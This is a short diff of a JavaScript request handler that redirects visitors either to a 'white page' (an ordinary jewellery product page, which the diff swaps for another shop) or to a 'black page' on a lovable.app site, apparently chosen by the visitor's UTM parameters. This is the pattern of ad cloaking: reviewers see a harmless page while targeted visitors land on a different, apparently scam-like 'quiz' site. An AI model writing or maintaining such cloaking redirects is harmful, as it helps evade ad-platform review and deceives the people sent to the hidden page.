@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.setdart.com/subasta/displayimage/cat=26/joyas/pid=351470707.html";
+    const whitePageURL = "https://www.davidlocco.com/products/essentials-nine-ring?variant=52817858494794";
     const blackPageURL = "https://instentquzzz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,3 +26,4 @@ export default function handler(req, res) {
     res.end();
 
   }
+
